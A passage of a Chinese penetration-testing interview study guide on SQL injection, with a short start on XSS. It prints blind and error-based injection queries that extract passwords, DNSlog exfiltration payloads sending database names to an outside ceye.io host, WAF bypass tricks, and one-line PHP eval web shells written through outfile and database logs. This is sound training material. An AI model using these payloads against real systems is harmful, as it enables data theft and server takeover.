+    <a href="#2%e6%8f%90%e4%ba%a4%e6%96%b9%e5%bc%8f%e7%9a%84%e4%b8%8d%e5%90%8c%e5%88%86%e7%b1%bb" class="header-mark"></a>0.1.2.2 (2)提交方式的不同分类</h5><p>●GET注入
+●POST注入
+●COOKIE注入
+●HTTP注入</p>
+<h5 id="3获取信息的方式不同分类" class="headerLink">
+    <a href="#3%e8%8e%b7%e5%8f%96%e4%bf%a1%e6%81%af%e7%9a%84%e6%96%b9%e5%bc%8f%e4%b8%8d%e5%90%8c%e5%88%86%e7%b1%bb" class="header-mark"></a>0.1.2.3 (3)获取信息的方式不同分类</h5><p>●基于布尔的盲注
+如果数据库中可以查到相应的数据，页面会正常显示，反之异常。</p>
+<p>●基于时间的盲注
+无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。</p>
+<p>●基于报错的注入</p>
+<p>●二次注入</p>
+<p>●宽字节注入</p>
+<p>有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义</p>
+<p>●盲注和延时注入的共同点？
+都是一个字符一个字符的判断</p>
+<h4 id="3盲注原理" class="headerLink">
+    <a href="#3%e7%9b%b2%e6%b3%a8%e5%8e%9f%e7%90%86" class="header-mark"></a>0.1.3 3.盲注原理</h4><p>将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果</p>
+<h4 id="4一个登录框怎么测试" class="headerLink">
+    <a href="#4%e4%b8%80%e4%b8%aa%e7%99%bb%e5%bd%95%e6%a1%86%e6%80%8e%e4%b9%88%e6%b5%8b%e8%af%95" class="header-mark"></a>0.1.4 4.一个登录框怎么测试</h4><ol>
+<li>验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。</li>
+<li>测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。</li>
+<li>测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。</li>
+<li>测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。</li>
+<li>测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。</li>
+<li>测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。</li>
+<li>测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。</li>
+</ol>
+<h4 id="5报错注入的函数有哪些" class="headerLink">
+    <a href="#5%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5%e7%9a%84%e5%87%bd%e6%95%b0%e6%9c%89%e5%93%aa%e4%ba%9b" class="header-mark"></a>0.1.5 5.报错注入的函数有哪些？</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">extractvalue(1, concat(0x5c,(select user())))
+</span></span><span class="line"><span class="cl">updatexml(0x3a,concat(1,(select user())),1)
+</span></span><span class="line"><span class="cl">exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b))
+</span></span><span class="line"><span class="cl">GTID_SUBSET(version(), 1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT 1),1,1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT LENGTH((SELECT username from users WHERE id=1));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username=&#39;admin&#39;),1,1));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="6sql-注入无回显的情况下利用-dnslogmysql-下利用什么构造代码mssql-下又如何构造" class="headerLink">
+    <a href="#6sql-%e6%b3%a8%e5%85%a5%e6%97%a0%e5%9b%9e%e6%98%be%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%88%a9%e7%94%a8-dnslogmysql-%e4%b8%8b%e5%88%a9%e7%94%a8%e4%bb%80%e4%b9%88%e6%9e%84%e9%80%a0%e4%bb%a3%e7%a0%81mssql-%e4%b8%8b%e5%8f%88%e5%a6%82%e4%bd%95%e6%9e%84%e9%80%a0" class="header-mark"></a>0.1.6 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？</h4><p>（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。
+（2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。
+（3）Mysql 中利用 load_file() 构造payload &rsquo; and if((select load_file(concat(&rsquo;\&rsquo;,(select database()),&rsquo;.xxx.ceye.io\abc&rsquo;))),1,0)#
+（4）Mssql 下利用 master..xp_dirtree 构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">DECLARE</span> <span class="err">@</span><span class="n">host</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span><span class="n">SELECT</span> <span class="err">@</span><span class="n">host</span><span class="o">=</span><span class="p">(</span><span class="n">SELECT</span> <span class="n">db_name</span><span class="p">())</span><span class="o">+</span><span class="s1">&#39;.xxx.ceye.io&#39;</span><span class="p">;</span><span class="n">EXEC</span><span class="p">(</span><span class="s1">&#39;master..xp_dirtree&#34;&#39;</span><span class="o">+</span><span class="err">@</span><span class="n">host</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\f</span><span class="s1">oobar$&#34;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="7sql注入时-and-or-被过滤怎办" class="headerLink">
+    <a href="#7sql%e6%b3%a8%e5%85%a5%e6%97%b6-and-or-%e8%a2%ab%e8%bf%87%e6%bb%a4%e6%80%8e%e5%8a%9e" class="header-mark"></a>0.1.7 7.SQL注入时 and or 被过滤怎办？</h4><p>1.大小写变形
+2.编码
+3.添加注释
+4.双写法
+5.利用符号形式
+6.浮点数 #数字被注释
+7.函数替代 #符号被注释</p>
+<h4 id="8sql注入过滤逗号如何处理" class="headerLink">
+    <a href="#8sql%e6%b3%a8%e5%85%a5%e8%bf%87%e6%bb%a4%e9%80%97%e5%8f%b7%e5%a6%82%e4%bd%95%e5%a4%84%e7%90%86" class="header-mark"></a>0.1.8 8.SQL注入过滤逗号如何处理</h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="n">database</span><span class="p">()</span> <span class="k">from</span> <span class="m">1</span> <span class="k">for</span> <span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="n">database</span><span class="p">()</span> <span class="k">from</span> <span class="m">1</span> <span class="k">for</span> <span class="m">1</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用join：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">union</span> <span class="k">select</span> <span class="m">1</span><span class="p">,</span><span class="m">2</span>     <span class="err">#等价于</span>
+</span></span><span class="line"><span class="cl"><span class="n">union</span> <span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="m">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="m">2</span><span class="p">)</span><span class="n">b</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用like：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="n">user</span><span class="p">(),</span><span class="m">1</span><span class="p">,</span><span class="m">1</span><span class="p">))=</span><span class="m">80</span>   <span class="err">#等价于</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="n">user</span><span class="p">()</span> <span class="n">like</span> <span class="err">&#39;</span><span class="n">r</span><span class="p">%</span><span class="err">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于limit可以使用offset来绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">news</span> <span class="n">limit</span> <span class="m">0</span><span class="p">,</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">等价于下面这条</span><span class="n">SQL语句</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">news</span> <span class="n">limit</span> <span class="m">1</span> <span class="n">offset</span> <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">table1</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="m">1</span> <span class="n">and</span> <span class="n">exists</span> <span class="p">(</span><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">table2</span> <span class="k">where</span> <span class="n">ord</span><span class="p">(</span><span class="n">substring</span><span class="p">(</span><span class="n">username</span> <span class="k">from</span> <span class="m">1</span> <span class="k">for</span> <span class="m">1</span><span class="p">)=</span><span class="m">97</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">127</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="p">*</span> <span class="n">FROM</span> <span class="p">((</span><span class="n">SELECT</span> <span class="m">1</span><span class="p">)</span><span class="n">a</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="m">2</span><span class="p">)</span><span class="n">b</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="m">3</span><span class="p">)</span><span class="n">c</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="m">4</span><span class="p">)</span><span class="n">d</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="m">5</span><span class="p">)</span><span class="n">e</span><span class="p">)</span><span class="err">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="k">case</span> <span class="n">when</span> <span class="n">substring</span><span class="p">((</span><span class="k">select</span> <span class="n">password</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span> <span class="k">where</span> <span class="n">user</span><span class="p">=</span><span class="err">&#39;</span><span class="n">root</span><span class="err">&#39;</span><span class="p">)</span> <span class="k">from</span> <span class="m">1</span> <span class="k">for</span> <span class="m">1</span><span class="p">)=</span><span class="sc">&#39;e&#39;</span> <span class="n">then</span> <span class="n">sleep</span><span class="p">(</span><span class="m">5</span><span class="p">)</span> <span class="k">else</span> <span class="m">0</span> <span class="n">end</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">substring</span><span class="p">((</span><span class="k">select</span> <span class="n">password</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span> <span class="k">where</span> <span class="n">user</span><span class="p">=</span><span class="err">&#39;</span><span class="n">root</span><span class="err">&#39;</span><span class="p">)</span> <span class="k">from</span> <span class="p">-</span><span class="m">1</span><span class="err">）</span><span class="p">=</span><span class="sc">&#39;e&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">原文：</span><span class="n">https</span><span class="p">:</span><span class="c1">//blog.csdn.net/nzjdsds/article/details/81322529 </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.jianshu.com/p/d10785d22db2" target="_blank" rel="noopener noreferrer">https://www.jianshu.com/p/d10785d22db2</a></p>
+<h4 id="9sql-注入绕过-waf的-方法" class="headerLink">
+    <a href="#9sql-%e6%b3%a8%e5%85%a5%e7%bb%95%e8%bf%87-waf%e7%9a%84-%e6%96%b9%e6%b3%95" class="header-mark"></a>0.1.9 9.sql 注入绕过 WAF的 方法？</h4><p><strong>白盒</strong></p>
+<p>根据waf的固定规则去寻找有没有漏网之鱼.</p>
+<p><strong>黑盒</strong></p>
+<p><strong>架构层绕waf</strong></p>
+<ol>
+<li>用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf</li>
+<li>在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf</li>
+<li>边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入.</li>
+</ol>
+<p><strong>协议层面绕过waf</strong></p>
+<ol>
+<li>
+<p>基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求</p>
+</li>
+<li>
+<p>文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过</p>
+</li>
+<li>
+<p>参数污染 有的waf仅对部分内容进行过滤如</p>
+</li>
+</ol>
+<p><strong>规则层面绕过</strong></p>
+<p>1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct
+2.注释绕过，如 <code>/*!select*/</code>，<code>/**/</code>，<code>/*!*/</code>，<code>/*!12345*/</code>，<code>#</code>
+3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字）
+4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF
+5.参数绕过，复制参数，id=1&amp;id=1
+6.组合法 如 and 可以用&amp;&amp;再 URL 编码
+7.替换法，如 and 改成&amp;&amp;;=可以用 like 或 in 等
+8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感）
+9.多重关键字绕过如ununionion selselectect（检测到敏感字符时替换为空）
+10.等价函数或命令绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">等价函数形式：Mysql查询：Union distinct、updatexml、Extractvalue、floor
+</span></span><span class="line"><span class="cl">字符串截取函数：mid、substr、substring、left、reverse
+</span></span><span class="line"><span class="cl">字符串连接函数：concat、group_concat、concat_ws
+</span></span><span class="line"><span class="cl">字符串转换：char、hex、unhex
+</span></span><span class="line"><span class="cl">替换逗号：limit 1 offset 0，mid(version() from 1 for 1)
+</span></span><span class="line"><span class="cl">替换等号：like
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>11.特殊符号绕过绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">限制形式：科学记数法</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="n">e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="n">e0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">空白字符</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="w"> </span><span class="o">%</span><span class="n">a0</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="n">b</span><span class="w"> </span><span class="o">%</span><span class="mi">20</span><span class="w"> </span><span class="o">%</span><span class="mi">09</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">反单引号</span><span class="w"> </span><span class="o">`</span><span class="n">table_name</span><span class="o">`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">括号</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="n">test</span><span class="p">.</span><span class="n">admin</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="10sql注入的告警的流量特征看哪些方面" class="headerLink">
+    <a href="#10sql%e6%b3%a8%e5%85%a5%e7%9a%84%e5%91%8a%e8%ad%a6%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81%e7%9c%8b%e5%93%aa%e4%ba%9b%e6%96%b9%e9%9d%a2" class="header-mark"></a>0.1.10 10.sql注入的告警的流量特征看哪些方面？</h4><p>如：and 1=1、order by、单引号/双引号、union select、information_schema
+column_name   字段名
+table_name  字段所属表名
+table_schema   字段所属表所属库的名字</p>
+<h4 id="11sql写入shell的两个函数" class="headerLink">
+    <a href="#11sql%e5%86%99%e5%85%a5shell%e7%9a%84%e4%b8%a4%e4%b8%aa%e5%87%bd%e6%95%b0" class="header-mark"></a>0.1.11 11.sql写入shell的两个函数</h4><p><strong>into outfile 和 into dunmpfile</strong>
+<strong>into outfile</strong> 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的
+<strong>into dumpfile</strong> 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll</p>
+<h4 id="12sqlmap的--os-shell原理" class="headerLink">
+    <a href="#12sqlmap%e7%9a%84--os-shell%e5%8e%9f%e7%90%86" class="header-mark"></a>0.1.12 12.sqlmap的&ndash;os-shell原理</h4><p>通过into outfile往服务器写入两个php文件（其中的tmpugvzq.php可以让我们上传文件到网站路径下、tmpbylqf.php文件用于命令执行并将输出的内容返回sqlmap端）</p>
+<h4 id="13sql写入shell的条件" class="headerLink">
+    <a href="#13sql%e5%86%99%e5%85%a5shell%e7%9a%84%e6%9d%a1%e4%bb%b6" class="header-mark"></a>0.1.13 13.sql写入shell的条件</h4><p>1.知道网站的绝对路径</p>
+<p>2.网站路径有写入权限</p>
+<p>3.当前数据库权限为dba（最高权限）</p>
+<p>4.<code>secure_file_priv</code>参数为空</p>
+<p>可以通过一下函数来查询secure_file_priv参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">show</span> <span class="n">global</span> <span class="n">variables</span> <span class="n">like</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">ecure_file_priv%&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>导入导出的权限在mysql数据库中是由secure_file_priv参数来控制的，当这个参数后面为null时，表示不允许导入导出，如果为具体文件夹时，表示仅允许在这个文件夹下导入导出，如果后面没有值（为空）时，表示可以在任何文件夹下导入导出。5.7版本后默认为null</p>
+</blockquote>
+<h4 id="14找绝对路径的方法" class="headerLink">
+    <a href="#14%e6%89%be%e7%bb%9d%e5%af%b9%e8%b7%af%e5%be%84%e7%9a%84%e6%96%b9%e6%b3%95" class="header-mark"></a>0.1.14 14.找绝对路径的方法</h4><p>1.网页报错信息
+2.Phpinfo，探针
+3.使用字典对目标站点的绝对路径暴力破解
+4.对目标网站进行js代码审计,查看是否存在信息泄露出站点的绝对路径</p>
+<h4 id="15sqlmap中risk和levels区别" class="headerLink">
+    <a href="#15sqlmap%e4%b8%adrisk%e5%92%8clevels%e5%8c%ba%e5%88%ab" class="header-mark"></a>0.1.15 15.sqlmap中risk和levels区别</h4><p>-r 参数表示风险等级，-level 参数表示扫描等级</p>
+<p>**风险等级（-r 或 &ndash;risk）：**表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</p>
+<p>**扫描等级（-level 或 &ndash;level）：**表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</p>
+<h4 id="16数据库全局日志写入" class="headerLink">
+    <a href="#16%e6%95%b0%e6%8d%ae%e5%ba%93%e5%85%a8%e5%b1%80%e6%97%a5%e5%bf%97%e5%86%99%e5%85%a5" class="header-mark"></a>0.1.16 16.数据库全局日志写入</h4><p>条件：</p>
+<ol>
+<li>数据库root权限</li>
+<li>获取网站的绝对路径</li>
+</ol>
+<p>查看是否开启了全局日志以及全局日志的存放位置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHOW VARIABLES LIKE &#39;%general%&#39; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改或者设置全局日志的保存目录为网站的web目录,并且日志保存为php文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set global general_log=on;
+</span></span><span class="line"><span class="cl">set global general_log_file=&#34;C:\\phpStudy\\WWW\\test.php&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置开启日志以及日志存储位置,这里日志存储位置为站点的根目录,执行命令写入日志文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT &#34;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="17数据库慢查询日志写入" class="headerLink">
+    <a href="#17%e6%95%b0%e6%8d%ae%e5%ba%93%e6%85%a2%e6%9f%a5%e8%af%a2%e6%97%a5%e5%bf%97%e5%86%99%e5%85%a5" class="header-mark"></a>0.1.17 17.数据库慢查询日志写入</h4><p>慢日志查询 记录所有执行时间超过字段long_query_time规定时间的所有查询或者不使用索引的查询,默认情况下慢查询日志为关闭,long_query_time值为10秒</p>
+<p>条件</p>
+<ol>
+<li>数据库root权限</li>
+<li>获取网站的绝对路径</li>
+</ol>
+<p>查询相关配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">show</span> <span class="n">variables</span> <span class="n">like</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">low%&#39;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set global slow_query_log=on;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select &#39;&lt;?php @eval($_POST[shell]);?&gt;&#39; or sleep(10); 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="18mysql-在渗透测试中的利用" class="headerLink">
+    <a href="#18mysql-%e5%9c%a8%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e4%b8%ad%e7%9a%84%e5%88%a9%e7%94%a8" class="header-mark"></a>0.1.18 18.Mysql 在渗透测试中的利用</h4><p>[Mysql 在渗透测试中的利用 | K0rz3n&rsquo;s Blog](<a href="https://www.k0rz3n.com/2018/10/21/Mysql" target="_blank" rel="noopener noreferrer">https://www.k0rz3n.com/2018/10/21/Mysql</a> 在渗透测试中的利用/#三、MYSQL-UDF-提权)</p>
+<h2 id="02-xss漏洞" class="headerLink">
+    <a href="#02-xss%e6%bc%8f%e6%b4%9e" class="header-mark"></a>1 02-xss漏洞</h2><h4 id="1原理-1" class="headerLink">
+    <a href="#1%e5%8e%9f%e7%90%86-1" class="header-mark"></a>1.0.19 1.原理</h4><p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p>
+<h4 id="2分类-1" class="headerLink">
+    <a href="#2%e5%88%86%e7%b1%bb-1" class="header-mark"></a>1.0.20 2.分类：</h4><p>反射型XSS
+储存型XSS
+DOM XSS</p>
+<h4 id="3危害" class="headerLink">
+    <a href="#3%e5%8d%b1%e5%ae%b3" class="header-mark"></a>1.0.21 3.危害</h4><p>​	1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
+​	2.攻击者能够在一定限度内记录用户的键盘输入。
+​	3.攻击者通过CSRF等方式以用户身份执行危险操作。
